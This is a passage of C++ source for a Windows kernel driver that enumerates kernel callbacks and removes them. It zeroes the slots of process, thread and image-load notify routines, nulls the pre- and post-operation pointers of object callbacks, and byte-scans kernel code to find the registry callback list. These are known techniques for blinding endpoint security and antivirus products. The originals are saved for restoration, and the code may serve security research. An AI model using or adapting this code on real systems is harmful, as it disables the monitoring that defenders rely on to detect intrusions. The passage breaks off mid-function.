		validCount++;

		KdPrint((DRIVER_PREFIX "[%d] ThreadCallback: 0x%llX (%s+0x%llX)\n",
			i, actualFunction, userBuffer[i].ModuleName, userBuffer[i].ModuleOffset));
	}

	KdPrint((DRIVER_PREFIX "Found %d active thread callbacks\n", validCount));
	*info = requiredSize;
	return STATUS_SUCCESS;
}

NTSTATUS HandleEnumImageCallbacks(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Enumerating image load callbacks\n"));

	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		return STATUS_NOT_SUPPORTED;
	}

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG requiredSize = sizeof(CallbackInformation) * MAX_CALLBACK_ENTRIES;

	if (outputLen < requiredSize)
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto userBuffer = (CallbackInformation*)Irp->AssociatedIrp.SystemBuffer;
	if (!userBuffer)
	{
		return STATUS_INVALID_PARAMETER;
	}

	ULONG64 callbackArray = FindPspLoadImageNotifyRoutine(windowsVersion);
	if (callbackArray == 0)
	{
		return STATUS_NOT_FOUND;
	}

	RtlZeroMemory(userBuffer, requiredSize);

	ULONG validCount = 0;
	for (ULONG i = 0; i < MAX_CALLBACK_ENTRIES; i++)
	{
		ULONG64 callbackEntry = 0;
		__try { callbackEntry = *(PULONG64)(callbackArray + (i * 8)); }
		__except (EXCEPTION_EXECUTE_HANDLER) { continue; }

		// Always set the index
		userBuffer[i].Index = i;

		// Check if callback entry is valid (ILCK style: MmIsAddressValid check)
		if (callbackEntry == 0 || !MmIsAddressValid((PVOID)callbackEntry))
		{
			continue;
		}

		// Mask off low 3 bits and dereference to get actual callback function (ILCK style)
		ULONG64 actualFunction = 0;
		__try { actualFunction = *(PULONG64)(callbackEntry & 0xFFFFFFFFFFFFFFF8); }
		__except (EXCEPTION_EXECUTE_HANDLER) { actualFunction = callbackEntry & 0xFFFFFFFFFFFFFFF8; }

		userBuffer[i].CallbackAddress = actualFunction;
		SearchLoadedModules(&userBuffer[i]);
		validCount++;

		KdPrint((DRIVER_PREFIX "[%d] ImageLoadCallback: 0x%llX (%s+0x%llX)\n",
			i, actualFunction, userBuffer[i].ModuleName, userBuffer[i].ModuleOffset));
	}

	KdPrint((DRIVER_PREFIX "Found %d active image load callbacks\n", validCount));
	*info = requiredSize;
	return STATUS_SUCCESS;
}

// ============== Callback Removal Handlers ==============

NTSTATUS HandleRemoveProcessCallback(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleRemoveProcessCallback called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(RemoveCallbackRequest))
	{
		KdPrint((DRIVER_PREFIX "Buffer too small\n"));
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (RemoveCallbackRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->Index >= MAX_CALLBACK_ENTRIES)
	{
		KdPrint((DRIVER_PREFIX "Invalid parameter: index=%d\n", request ? request->Index : 0));
		return STATUS_INVALID_PARAMETER;
	}

	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		return STATUS_NOT_SUPPORTED;
	}

	ULONG64 arrayAddress = FindPspSetCreateProcessNotifyRoutine(windowsVersion);
	if (arrayAddress == 0)
	{
		KdPrint((DRIVER_PREFIX "Failed to find PspSetCreateProcessNotifyRoutine array\n"));
		return STATUS_NOT_FOUND;
	}

	// Calculate slot address
	ULONG64 slotAddress = arrayAddress + (request->Index * 8);

	// Zero out the callback slot using RtlZeroMemory (TCKC style)
	__try
	{
		ULONG64 slotValue = *(PULONG64)slotAddress;
		if (slotValue == 0)
		{
			KdPrint((DRIVER_PREFIX "Process callback slot %d is already empty\n", request->Index));
			return STATUS_SUCCESS;
		}

		// Validate the slot contains a valid pointer before removal
		if (!MmIsAddressValid((PVOID)slotValue))
		{
			KdPrint((DRIVER_PREFIX "Process callback slot %d contains invalid address 0x%llX\n", request->Index, slotValue));
			return STATUS_INVALID_ADDRESS;
		}

		// Dereference to get actual callback address for logging
		ULONG64 callbackAddr = *(PULONG64)(slotValue & 0xFFFFFFFFFFFFFFF8);

		// Save original value for restoration
		g_RemovedProcessCallbacks[request->Index].IsRemoved = TRUE;
		g_RemovedProcessCallbacks[request->Index].OriginalValue = slotValue;
		g_RemovedProcessCallbacks[request->Index].SlotAddress = slotAddress;

		// Zero the slot using RtlZeroMemory (like TCKC)
		RtlZeroMemory((PVOID)slotAddress, sizeof(ULONG64));
		KdPrint((DRIVER_PREFIX "Removed process callback at index %d (callback was 0x%llX, saved for restore)\n", request->Index, callbackAddr));
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Exception while removing process callback at index %d\n", request->Index));
		return STATUS_ACCESS_VIOLATION;
	}

	return STATUS_SUCCESS;
}

NTSTATUS HandleRemoveThreadCallback(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleRemoveThreadCallback called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(RemoveCallbackRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (RemoveCallbackRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->Index >= MAX_CALLBACK_ENTRIES)
	{
		return STATUS_INVALID_PARAMETER;
	}

	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		return STATUS_NOT_SUPPORTED;
	}

	ULONG64 arrayAddress = FindPspCreateThreadNotifyRoutine(windowsVersion);
	if (arrayAddress == 0)
	{
		KdPrint((DRIVER_PREFIX "Failed to find PspCreateThreadNotifyRoutine array\n"));
		return STATUS_NOT_FOUND;
	}

	ULONG64 slotAddress = arrayAddress + (request->Index * 8);

	// Zero out the callback slot using RtlZeroMemory (TCKC style)
	__try
	{
		ULONG64 slotValue = *(PULONG64)slotAddress;
		if (slotValue == 0)
		{
			KdPrint((DRIVER_PREFIX "Thread callback slot %d is already empty\n", request->Index));
			return STATUS_SUCCESS;
		}

		// Validate the slot contains a valid pointer before removal
		if (!MmIsAddressValid((PVOID)slotValue))
		{
			KdPrint((DRIVER_PREFIX "Thread callback slot %d contains invalid address 0x%llX\n", request->Index, slotValue));
			return STATUS_INVALID_ADDRESS;
		}

		// Dereference to get actual callback address for logging
		ULONG64 callbackAddr = *(PULONG64)(slotValue & 0xFFFFFFFFFFFFFFF8);

		// Save original value for restoration
		g_RemovedThreadCallbacks[request->Index].IsRemoved = TRUE;
		g_RemovedThreadCallbacks[request->Index].OriginalValue = slotValue;
		g_RemovedThreadCallbacks[request->Index].SlotAddress = slotAddress;

		// Zero the slot using RtlZeroMemory (like TCKC)
		RtlZeroMemory((PVOID)slotAddress, sizeof(ULONG64));
		KdPrint((DRIVER_PREFIX "Removed thread callback at index %d (callback was 0x%llX, saved for restore)\n", request->Index, callbackAddr));
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Exception while removing thread callback at index %d\n", request->Index));
		return STATUS_ACCESS_VIOLATION;
	}

	return STATUS_SUCCESS;
}

NTSTATUS HandleRemoveImageCallback(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleRemoveImageCallback called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(RemoveCallbackRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (RemoveCallbackRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->Index >= MAX_CALLBACK_ENTRIES)
	{
		return STATUS_INVALID_PARAMETER;
	}

	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		return STATUS_NOT_SUPPORTED;
	}

	ULONG64 arrayAddress = FindPspLoadImageNotifyRoutine(windowsVersion);
	if (arrayAddress == 0)
	{
		KdPrint((DRIVER_PREFIX "Failed to find PspLoadImageNotifyRoutine array\n"));
		return STATUS_NOT_FOUND;
	}

	ULONG64 slotAddress = arrayAddress + (request->Index * 8);

	// Zero out the callback slot using RtlZeroMemory (TCKC style)
	__try
	{
		ULONG64 slotValue = *(PULONG64)slotAddress;
		if (slotValue == 0)
		{
			KdPrint((DRIVER_PREFIX "Image callback slot %d is already empty\n", request->Index));
			return STATUS_SUCCESS;
		}

		// Validate the slot contains a valid pointer before removal
		if (!MmIsAddressValid((PVOID)slotValue))
		{
			KdPrint((DRIVER_PREFIX "Image callback slot %d contains invalid address 0x%llX\n", request->Index, slotValue));
			return STATUS_INVALID_ADDRESS;
		}

		// Dereference to get actual callback address for logging
		ULONG64 callbackAddr = *(PULONG64)(slotValue & 0xFFFFFFFFFFFFFFF8);

		// Save original value for restoration
		g_RemovedImageCallbacks[request->Index].IsRemoved = TRUE;
		g_RemovedImageCallbacks[request->Index].OriginalValue = slotValue;
		g_RemovedImageCallbacks[request->Index].SlotAddress = slotAddress;

		// Zero the slot using RtlZeroMemory (like TCKC)
		RtlZeroMemory((PVOID)slotAddress, sizeof(ULONG64));
		KdPrint((DRIVER_PREFIX "Removed image callback at index %d (callback was 0x%llX, saved for restore)\n", request->Index, callbackAddr));
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Exception while removing image callback at index %d\n", request->Index));
		return STATUS_ACCESS_VIOLATION;
	}

	return STATUS_SUCCESS;
}

// ============== Object Callback Removal (OCKC style) ==============

NTSTATUS HandleRemoveObjectCallback(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleRemoveObjectCallback called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(RemoveObjectCallbackRequest))
	{
		KdPrint((DRIVER_PREFIX "Buffer too small\n"));
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (RemoveObjectCallbackRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		KdPrint((DRIVER_PREFIX "Invalid parameter: null request\n"));
		return STATUS_INVALID_PARAMETER;
	}

	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		return STATUS_NOT_SUPPORTED;
	}

	ULONG callbackListOffset = OBJECT_TYPE_CALLBACKLIST_OFFSET[windowsVersion];
	POBJECT_TYPE objectType = nullptr;

	// Select the correct object type based on request
	if (request->ObjectType == ObjectCallbackProcess)
	{
		objectType = *PsProcessType;
		KdPrint((DRIVER_PREFIX "Removing from Process object callbacks\n"));
	}
	else if (request->ObjectType == ObjectCallbackThread)
	{
		objectType = *PsThreadType;
		KdPrint((DRIVER_PREFIX "Removing from Thread object callbacks\n"));
	}
	else
	{
		KdPrint((DRIVER_PREFIX "Invalid object type: %d\n", request->ObjectType));
		return STATUS_INVALID_PARAMETER;
	}

	if (!objectType)
	{
		KdPrint((DRIVER_PREFIX "Failed to get object type\n"));
		return STATUS_NOT_FOUND;
	}

	__try
	{
		// Get CallbackList at offset in _OBJECT_TYPE
		PLIST_ENTRY callbackListHead = (PLIST_ENTRY)((ULONG_PTR)objectType + callbackListOffset);
		PLIST_ENTRY entry = callbackListHead->Flink;
		ULONG currentIndex = 0;
		BOOLEAN found = FALSE;

		// Walk the callback list to find the entry by index
		while (entry != callbackListHead)
		{
			if (currentIndex == request->Index)
			{
				PCALLBACK_ENTRY_ITEM callbackItem = CONTAINING_RECORD(entry, CALLBACK_ENTRY_ITEM, EntryItemList);

				if (callbackItem && MmIsAddressValid(callbackItem))
				{
					// Select the correct storage array based on object type
					RemovedObjectCallback* storage = (request->ObjectType == ObjectCallbackProcess)
						? g_RemovedProcessObjectCallbacks
						: g_RemovedThreadObjectCallbacks;

					// Save the callback entry pointer for restoration
					storage[request->Index].CallbackEntryItem = callbackItem;
					storage[request->Index].IsRemoved = TRUE;

					// Remove PreOperation callback using InterlockedExchangePointer (OCKC style)
					if (request->RemovePreOperation && callbackItem->PreOperation)
					{
						// Save original PreOperation for restoration
						storage[request->Index].PreOperation = callbackItem->PreOperation;
						KdPrint((DRIVER_PREFIX "Removing PreOperation callback at 0x%llX (saved for restore)\n",
							(ULONG64)callbackItem->PreOperation));
						InterlockedExchangePointer((PVOID*)&callbackItem->PreOperation, NULL);
					}

					// Remove PostOperation callback using InterlockedExchangePointer (OCKC style)
					if (request->RemovePostOperation && callbackItem->PostOperation)
					{
						// Save original PostOperation for restoration
						storage[request->Index].PostOperation = callbackItem->PostOperation;
						KdPrint((DRIVER_PREFIX "Removing PostOperation callback at 0x%llX (saved for restore)\n",
							(ULONG64)callbackItem->PostOperation));
						InterlockedExchangePointer((PVOID*)&callbackItem->PostOperation, NULL);
					}

					found = TRUE;
					KdPrint((DRIVER_PREFIX "Successfully removed object callback at index %d\n", request->Index));
				}
				break;
			}

			currentIndex++;
			entry = entry->Flink;
		}

		if (!found)
		{
			KdPrint((DRIVER_PREFIX "Callback at index %d not found\n", request->Index));
			return STATUS_NOT_FOUND;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Exception while removing object callback at index %d\n", request->Index));
		return STATUS_ACCESS_VIOLATION;
	}

	return STATUS_SUCCESS;
}

NTSTATUS HandleEnumObjectCallbacks(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Enumerating object callbacks (ObRegisterCallbacks)\n"));

	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		KdPrint((DRIVER_PREFIX "Windows version unsupported for object callback enumeration\n"));
		return STATUS_NOT_SUPPORTED;
	}

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG requiredSize = sizeof(EnumObjectCallbacksResponse) +
		(sizeof(ObjectCallbackInfo) * (MAX_OBJECT_CALLBACK_ENTRIES - 1));

	if (outputLen < requiredSize)
	{
		KdPrint((DRIVER_PREFIX "Buffer too small (need %d bytes, got %d)\n", requiredSize, outputLen));
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (EnumObjectCallbacksResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	RtlZeroMemory(response, requiredSize);

	ULONG callbackCount = 0;
	ULONG callbackListOffset = OBJECT_TYPE_CALLBACKLIST_OFFSET[windowsVersion];
	NTSTATUS status = STATUS_SUCCESS;

	// Enumerate Process object callbacks
	__try
	{
		// Get the Process object type
		POBJECT_TYPE processType = *PsProcessType;
		if (processType)
		{
			KdPrint((DRIVER_PREFIX "Process ObjectType at 0x%p\n", processType));

			// Get CallbackList at offset in _OBJECT_TYPE
			PLIST_ENTRY callbackListHead = (PLIST_ENTRY)((ULONG_PTR)processType + callbackListOffset);
			KdPrint((DRIVER_PREFIX "Process CallbackList head at 0x%p\n", callbackListHead));

			// Walk the callback list
			PLIST_ENTRY entry = callbackListHead->Flink;
			while (entry != callbackListHead && callbackCount < MAX_OBJECT_CALLBACK_ENTRIES)
			{
				// Entry points to EntryItemList in CALLBACK_ENTRY_ITEM
				PCALLBACK_ENTRY_ITEM callbackItem = CONTAINING_RECORD(entry, CALLBACK_ENTRY_ITEM, EntryItemList);

				if (callbackItem && MmIsAddressValid(callbackItem))
				{
					ObjectCallbackInfo* cbInfo = &response->Entries[callbackCount];
					cbInfo->ObjectType = ObjectCallbackProcess;
					cbInfo->Operations = (ObjectCallbackOperations)callbackItem->Operations;
					cbInfo->Index = callbackCount;

					// Get Pre/Post operation callbacks
					if (callbackItem->PreOperation && MmIsAddressValid(callbackItem->PreOperation))
					{
						cbInfo->PreOperationCallback = (ULONG64)callbackItem->PreOperation;
					}
					if (callbackItem->PostOperation && MmIsAddressValid(callbackItem->PostOperation))
					{
						cbInfo->PostOperationCallback = (ULONG64)callbackItem->PostOperation;
					}

					// Get altitude from parent CALLBACK_ENTRY
					if (callbackItem->CallbackEntry && MmIsAddressValid(callbackItem->CallbackEntry))
					{
						PCALLBACK_ENTRY callbackEntry = callbackItem->CallbackEntry;
						if (callbackEntry->AltitudeString && MmIsAddressValid(callbackEntry->AltitudeString))
						{
							// Convert altitude to ANSI
							UNICODE_STRING altitudeUnicode;
							altitudeUnicode.Buffer = callbackEntry->AltitudeString;
							altitudeUnicode.Length = callbackEntry->AltitudeLength1;
							altitudeUnicode.MaximumLength = callbackEntry->AltitudeLength2;

							ANSI_STRING altitudeAnsi;
							altitudeAnsi.Buffer = cbInfo->Altitude;
							altitudeAnsi.Length = 0;
							altitudeAnsi.MaximumLength = MAX_ALTITUDE_LENGTH - 1;

							RtlUnicodeStringToAnsiString(&altitudeAnsi, &altitudeUnicode, FALSE);
						}
					}

					// Resolve module name and RVA offsets (OCKC style)
					if (cbInfo->PreOperationCallback)
					{
						CallbackInformation tempInfo = { 0 };
						tempInfo.CallbackAddress = cbInfo->PreOperationCallback;
						SearchLoadedModules(&tempInfo);
						RtlCopyMemory(cbInfo->ModuleName, tempInfo.ModuleName, MAX_MODULE_NAME_LENGTH);
						cbInfo->ModuleBase = tempInfo.ModuleBase;
						cbInfo->PreOperationOffset = tempInfo.ModuleOffset;
					}
					if (cbInfo->PostOperationCallback)
					{
						CallbackInformation tempInfo = { 0 };
						tempInfo.CallbackAddress = cbInfo->PostOperationCallback;
						SearchLoadedModules(&tempInfo);
						// If we don't have a module name yet, use this one
						if (cbInfo->ModuleName[0] == '\0')
						{
							RtlCopyMemory(cbInfo->ModuleName, tempInfo.ModuleName, MAX_MODULE_NAME_LENGTH);
							cbInfo->ModuleBase = tempInfo.ModuleBase;
						}
						cbInfo->PostOperationOffset = tempInfo.ModuleOffset;
					}

					KdPrint((DRIVER_PREFIX "[%d] ProcessObjCallback: Pre=0x%llX(+0x%llX) Post=0x%llX(+0x%llX) -> %s (Alt: %s)\n",
						callbackCount, cbInfo->PreOperationCallback, cbInfo->PreOperationOffset,
						cbInfo->PostOperationCallback, cbInfo->PostOperationOffset,
						cbInfo->ModuleName, cbInfo->Altitude));

					callbackCount++;
				}

				entry = entry->Flink;
			}
		}

		// Enumerate Thread object callbacks
		POBJECT_TYPE threadType = *PsThreadType;
		if (threadType)
		{
			KdPrint((DRIVER_PREFIX "Thread ObjectType at 0x%p\n", threadType));

			PLIST_ENTRY callbackListHead = (PLIST_ENTRY)((ULONG_PTR)threadType + callbackListOffset);
			KdPrint((DRIVER_PREFIX "Thread CallbackList head at 0x%p\n", callbackListHead));

			PLIST_ENTRY entry = callbackListHead->Flink;
			while (entry != callbackListHead && callbackCount < MAX_OBJECT_CALLBACK_ENTRIES)
			{
				PCALLBACK_ENTRY_ITEM callbackItem = CONTAINING_RECORD(entry, CALLBACK_ENTRY_ITEM, EntryItemList);

				if (callbackItem && MmIsAddressValid(callbackItem))
				{
					ObjectCallbackInfo* cbInfo = &response->Entries[callbackCount];
					cbInfo->ObjectType = ObjectCallbackThread;
					cbInfo->Operations = (ObjectCallbackOperations)callbackItem->Operations;
					cbInfo->Index = callbackCount;

					if (callbackItem->PreOperation && MmIsAddressValid(callbackItem->PreOperation))
					{
						cbInfo->PreOperationCallback = (ULONG64)callbackItem->PreOperation;
					}
					if (callbackItem->PostOperation && MmIsAddressValid(callbackItem->PostOperation))
					{
						cbInfo->PostOperationCallback = (ULONG64)callbackItem->PostOperation;
					}

					if (callbackItem->CallbackEntry && MmIsAddressValid(callbackItem->CallbackEntry))
					{
						PCALLBACK_ENTRY callbackEntry = callbackItem->CallbackEntry;
						if (callbackEntry->AltitudeString && MmIsAddressValid(callbackEntry->AltitudeString))
						{
							UNICODE_STRING altitudeUnicode;
							altitudeUnicode.Buffer = callbackEntry->AltitudeString;
							altitudeUnicode.Length = callbackEntry->AltitudeLength1;
							altitudeUnicode.MaximumLength = callbackEntry->AltitudeLength2;

							ANSI_STRING altitudeAnsi;
							altitudeAnsi.Buffer = cbInfo->Altitude;
							altitudeAnsi.Length = 0;
							altitudeAnsi.MaximumLength = MAX_ALTITUDE_LENGTH - 1;

							RtlUnicodeStringToAnsiString(&altitudeAnsi, &altitudeUnicode, FALSE);
						}
					}

					// Resolve module name and RVA offsets (OCKC style)
					if (cbInfo->PreOperationCallback)
					{
						CallbackInformation tempInfo = { 0 };
						tempInfo.CallbackAddress = cbInfo->PreOperationCallback;
						SearchLoadedModules(&tempInfo);
						RtlCopyMemory(cbInfo->ModuleName, tempInfo.ModuleName, MAX_MODULE_NAME_LENGTH);
						cbInfo->ModuleBase = tempInfo.ModuleBase;
						cbInfo->PreOperationOffset = tempInfo.ModuleOffset;
					}
					if (cbInfo->PostOperationCallback)
					{
						CallbackInformation tempInfo = { 0 };
						tempInfo.CallbackAddress = cbInfo->PostOperationCallback;
						SearchLoadedModules(&tempInfo);
						if (cbInfo->ModuleName[0] == '\0')
						{
							RtlCopyMemory(cbInfo->ModuleName, tempInfo.ModuleName, MAX_MODULE_NAME_LENGTH);
							cbInfo->ModuleBase = tempInfo.ModuleBase;
						}
						cbInfo->PostOperationOffset = tempInfo.ModuleOffset;
					}

					KdPrint((DRIVER_PREFIX "[%d] ThreadObjCallback: Pre=0x%llX(+0x%llX) Post=0x%llX(+0x%llX) -> %s (Alt: %s)\n",
						callbackCount, cbInfo->PreOperationCallback, cbInfo->PreOperationOffset,
						cbInfo->PostOperationCallback, cbInfo->PostOperationOffset,
						cbInfo->ModuleName, cbInfo->Altitude));

					callbackCount++;
				}

				entry = entry->Flink;
			}
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Exception during object callback enumeration\n"));
		status = STATUS_UNSUCCESSFUL;
	}

	response->Count = callbackCount;
	KdPrint((DRIVER_PREFIX "Found %d total object callbacks\n", callbackCount));
	*info = requiredSize;
	return status;
}

// ============== Registry Callback Enumeration (RCK style) ==============

// Registry callback item structure (from CmRegisterCallback internal structures)
typedef struct _REGISTRY_CALLBACK_ITEM {
	LIST_ENTRY Item;
	DWORD64 Unknown1[2];
	DWORD64 Context;
	DWORD64 Function;
	UNICODE_STRING Altitude;
	DWORD64 Unknown2[2];
} REGISTRY_CALLBACK_ITEM, * PREGISTRY_CALLBACK_ITEM;

// Find the CallbackListHead for registry callbacks using signature scanning (RCK style)
ULONG64 FindCmCallbackListHead()
{
	// Get the address of nt!CmRegisterCallback
	UNICODE_STRING routineName;
	RtlInitUnicodeString(&routineName, L"CmRegisterCallback");
	ULONG64 routineAddress = (ULONG64)MmGetSystemRoutineAddress(&routineName);
	if (!routineAddress)
	{
		KdPrint((DRIVER_PREFIX "Failed to find CmRegisterCallback\n"));
		return 0;
	}
	KdPrint((DRIVER_PREFIX "CmRegisterCallback at 0x%llX\n", routineAddress));

	// Search for the first CALL or JMP instruction to find CmpRegisterCallbackInternal
	ULONG64 tempAddress = 0;
	for (int offset = 0; offset < 200; offset++)
	{
		UCHAR instruction = *(PUCHAR)(routineAddress + offset);
		if (instruction == 0xE9 || instruction == 0xE8)  // JMP or CALL
		{
			LONG relativeOffset = *(LONG*)(routineAddress + offset + 1);
			tempAddress = routineAddress + offset + 5 + relativeOffset;
			KdPrint((DRIVER_PREFIX "Found CmpRegisterCallbackInternal at 0x%llX\n", tempAddress));
			break;
		}
	}

	if (!tempAddress)
	{
		KdPrint((DRIVER_PREFIX "Failed to find CmpRegisterCallbackInternal\n"));
		return 0;
	}

	// Scan for the last INT 3 (0xCC) in CmpRegisterCallbackInternal
	// The function CmpInsertCallbackInListByAltitude follows the INT 3 padding
	ULONG64 CmpInsertCallbackInListByAltitudeAddr = 0;
	for (int i = 0; i < 1024; i++)
	{
		if (*(PUCHAR)(tempAddress + i) == 0xCC)
		{
			// Skip all consecutive INT 3 instructions
			while (*(PUCHAR)(tempAddress + i) == 0xCC) i++;

			CmpInsertCallbackInListByAltitudeAddr = tempAddress + i;
			KdPrint((DRIVER_PREFIX "Found CmpInsertCallbackInListByAltitude at 0x%llX\n",
				CmpInsertCallbackInListByAltitudeAddr));
			break;
		}
	}

	if (!CmpInsertCallbackInListByAltitudeAddr)
	{
		KdPrint((DRIVER_PREFIX "Failed to find CmpInsertCallbackInListByAltitude\n"));
		return 0;
	}

	// Search for the first LEA instruction to find CallbackListHead
	ULONG64 callbackListHead = 0;
	for (int i = 0; i < 300; i++)
	{
		// Check for LEA opcode (0x4C 0x8D for LEA RXX, [address])
		if ((*(PUCHAR)(CmpInsertCallbackInListByAltitudeAddr + i) == 0x4C) &&
			*(PUCHAR)(CmpInsertCallbackInListByAltitudeAddr + i + 1) == 0x8D)
		{
			// Extract the relative offset (4 bytes following the opcode and ModR/M byte)
			LONG offset = *(LONG*)(CmpInsertCallbackInListByAltitudeAddr + i + 3);

			// Calculate the address of CallbackListHead: current position + instruction length (7) + offset
			callbackListHead = CmpInsertCallbackInListByAltitudeAddr + i + 7 + offset;
			KdPrint((DRIVER_PREFIX "Found CallbackListHead at 0x%llX\n", callbackListHead));
			break;
		}
	}

	return callbackListHead;
}

// Helper to search for module containing a registry callback
void SearchModulesForRegistry(RegistryCallbackInfo* CallbackInfo)
{
	NTSTATUS status;
	ULONG modulesSize = 0;
	AUX_MODULE_EXTENDED_INFO* modules = nullptr;
	ULONG numberOfModules = 0;

	status = AuxKlibInitialize();
	if (!NT_SUCCESS(status))
	{
		return;
	}

	status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), NULL);
	if (!NT_SUCCESS(status) || modulesSize == 0)
	{
		return;
	}

	numberOfModules = modulesSize / sizeof(AUX_MODULE_EXTENDED_INFO);
	modules = (AUX_MODULE_EXTENDED_INFO*)ExAllocatePoolWithTag(PagedPool, modulesSize, DRIVER_TAG);
	if (!modules)
	{
		return;
	}

	RtlZeroMemory(modules, modulesSize);
	status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), modules);
	if (!NT_SUCCESS(status))
	{
		ExFreePoolWithTag(modules, DRIVER_TAG);
		return;
	}

	// Find the module containing the callback address
	for (ULONG i = 0; i < numberOfModules; i++)
	{
		ULONG64 moduleBase = (ULONG64)modules[i].BasicInfo.ImageBase;
		ULONG64 moduleEnd = moduleBase + modules[i].ImageSize;

		if (CallbackInfo->CallbackAddress >= moduleBase && CallbackInfo->CallbackAddress < moduleEnd)
		{
			// Found the module
			CallbackInfo->ModuleBase = moduleBase;
			CallbackInfo->ModuleOffset = CallbackInfo->CallbackAddress - moduleBase;

			// Copy module name (filename only)
			const char* fullPath = (const char*)(modules[i].FullPathName + modules[i].FileNameOffset);
			strncpy(CallbackInfo->ModuleName, fullPath, MAX_MODULE_NAME_LENGTH - 1);
			CallbackInfo->ModuleName[MAX_MODULE_NAME_LENGTH - 1] = '\0';
			break;
		}
	}

	ExFreePoolWithTag(modules, DRIVER_TAG);
}

NTSTATUS HandleEnumRegistryCallbacks(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Enumerating registry callbacks (CmRegisterCallback)\n"));

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG requiredSize = sizeof(EnumRegistryCallbacksResponse) +
		(sizeof(RegistryCallbackInfo) * (MAX_REGISTRY_CALLBACK_ENTRIES - 1));

	if (outputLen < requiredSize)
	{
		KdPrint((DRIVER_PREFIX "Buffer too small (need %d bytes, got %d)\n", requiredSize, outputLen));
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (EnumRegistryCallbacksResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	RtlZeroMemory(response, requiredSize);

	// Find the CallbackListHead
	ULONG64 callbackListHead = FindCmCallbackListHead();
	if (!callbackListHead)
	{
		KdPrint((DRIVER_PREFIX "Failed to find registry CallbackListHead\n"));
		return STATUS_NOT_FOUND;
	}

	ULONG callbackCount = 0;
	NTSTATUS status = STATUS_SUCCESS;

	__try
	{
		// The CallbackListHead is the head of a linked list of REGISTRY_CALLBACK_ITEM
		PREGISTRY_CALLBACK_ITEM currentItem = (PREGISTRY_CALLBACK_ITEM)callbackListHead;

		// Start from the first entry (Flink from the list head)
		// The list head itself is part of the structure, so we navigate from Item.Flink
		PLIST_ENTRY entry = ((PLIST_ENTRY)callbackListHead)->Flink;

		while ((ULONG64)entry != callbackListHead && callbackCount < MAX_REGISTRY_CALLBACK_ENTRIES)
		{
			PREGISTRY_CALLBACK_ITEM callbackItem = CONTAINING_RECORD(entry, REGISTRY_CALLBACK_ITEM, Item);

			if (callbackItem && MmIsAddressValid(callbackItem) && callbackItem->Function != 0)
			{
				RegistryCallbackInfo* cbInfo = &response->Entries[callbackCount];
				cbInfo->Index = callbackCount;
				cbInfo->CallbackAddress = callbackItem->Function;
				cbInfo->Context = callbackItem->Context;

				// Get altitude from UNICODE_STRING
				if (callbackItem->Altitude.Buffer && MmIsAddressValid(callbackItem->Altitude.Buffer))
				{
					ANSI_STRING ansiAltitude;
					NTSTATUS convStatus = RtlUnicodeStringToAnsiString(&ansiAltitude, &callbackItem->Altitude, TRUE);
					if (NT_SUCCESS(convStatus))
					{
						strncpy(cbInfo->Altitude, ansiAltitude.Buffer, MAX_ALTITUDE_LENGTH - 1);
